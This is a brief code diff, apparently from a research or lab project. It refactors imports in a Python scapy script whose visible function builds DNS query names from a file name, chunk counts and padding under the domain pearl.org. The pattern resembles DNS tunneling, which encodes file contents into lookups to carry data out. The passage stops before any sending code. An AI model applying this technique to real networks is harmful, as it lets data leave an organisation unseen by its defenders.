@@ -1,10 +1,10 @@
 import time
 import socket
-import config
+from config import *
 from scapy.all import *
 slice_cnt = N//T + 1
 def generate_send(filename, cw_list, cw_cnt, pad_bytes):
-    dnsIP = config.dst_addrs()
+    dnsIP = dst_addrs()
     fqdn_prefix = filename + '.' + str(cw_cnt) + '.'
     fqdn_suffix = '.' + str(pad_bytes) + '.pearl.org'
     for chunk_num in range(cw_cnt):
